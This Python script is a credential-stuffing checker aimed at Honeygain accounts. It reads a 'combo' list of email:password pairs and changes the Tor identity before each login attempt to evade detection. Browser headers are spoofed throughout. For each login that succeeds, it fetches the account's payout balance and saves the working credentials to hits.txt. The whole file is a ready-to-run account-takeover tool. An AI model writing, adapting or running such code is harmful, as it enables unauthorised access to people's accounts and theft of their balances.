import json
from stem import Signal
from stem.control import Controller
import os
import requests
from colorama import Fore
import random
from concurrent.futures import ThreadPoolExecutor 

requests = requests.Session()

_CONFIG=json.load(open("config.json"))

def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='root')
        controller.signal(Signal.NEWNYM)  
def checklogin(email, password):
    key = ""
    loginUrl = "https://dashboard.honeygain.com/api/v1/users/tokens"
    
    loginData = {
        "email": email,
        "password": password
    }
    loginreq = requests.post(url=loginUrl, headers=_CONFIG["headers"], data=json.dumps(loginData), proxies=_CONFIG["proxies"])
    if "access_token" in loginreq.text:
        key = loginreq.json()['data']['access_token']
        return True, key
    elif "not_valid_login_credentials" in loginreq.text:
        return False, None
    else:
        print(loginreq.text)
        return False, "retry"

def getAccountInfo(key):
    infoUrl = "https://dashboard.honeygain.com/api/v1/users/balances"
    infoHead = {
        "authorization": "Bearer " + key,
        "accept": "application/json, text/plain, */*",
        "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6",
        "content-type": "application/json",
        "priority": "u=1, i",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    }
    reqinfo = requests.get(url=infoUrl, headers=infoHead).json()
    return reqinfo['data']['payout']


def successResult(cred, credits, cents):
    terminal_size = os.get_terminal_size()
    width = terminal_size.columns
    print(Fore.GREEN + '-' * width)
    print(Fore.GREEN + f"[+] GOOD : {cred} | Balance : {credits} in USD: {int(cents)/100}$ ")
    print(Fore.GREEN + '-' * width + Fore.WHITE)
    save = open("hits.txt", "a").write(f"[+] GOOD : {cred} | Balance : {credits} in USD: {int(cents)/100}$ \n")


def task(cred):
    email = cred.split(":")[0]
    password = cred.split(":")[1]
    login, key = checklogin(email, password)
    
    if login:
        balance = getAccountInfo(key)
        successResult(cred, str(balance['credits']), str(balance['usd_cents']))
    elif key=="retry":
        print(Fore.YELLOW + "[!] RETRY : " + Fore.WHITE + cred)
    else:
        print(Fore.RED + "[-] BAD : " + Fore.WHITE + cred)


def main():
    Good = 0
    Bad = 0
    list=input("Give Combo name(combo should be in this folder!) : ")
    with open(list, "r", encoding="utf-8") as file:
        max_threads = 1
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            for line in file:
                renew_tor_ip()
                cred = line.strip()
                executor.submit(task, cred) 
        
main()
